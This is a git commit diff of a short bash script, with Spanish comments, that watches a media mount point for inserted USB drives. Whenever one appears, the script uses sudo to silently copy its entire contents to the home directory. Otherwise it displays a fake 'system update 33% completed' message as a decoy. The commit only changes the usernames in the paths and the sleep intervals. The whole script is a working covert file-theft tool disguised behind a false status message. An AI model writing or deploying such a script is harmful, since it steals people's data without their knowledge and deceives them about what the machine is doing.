8e76709f6822017adda670384c48df698bef1ff5
Sanfeire <67929659+Sanfeire@users.noreply.github.com>
2021-10-13 22:47:55 +0100

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,14 +1,16 @@
 #!/bin/bash
-FILE=/media/pwned/
+FILE=/media/santi/
 #DATE=$(date +"%H-%M-%S")
 while true; do
 #cambiar por el archivo, comprobar con los pendrives
 if [ "$(ls $FILE)" ]
 then
-  sudo cp -r $FILE /home/pwned/$RANDOM
+  sudo cp -r $FILE /home/santi/$RANDOM
+  sleep 20
 else
   echo "Actualizando o sistema... 33% completado"
 fi
 #cambiar por el usuario, atento la línea del copiado (revisa antes que aparece)
-sleep 40
+sleep 30
 done
+      
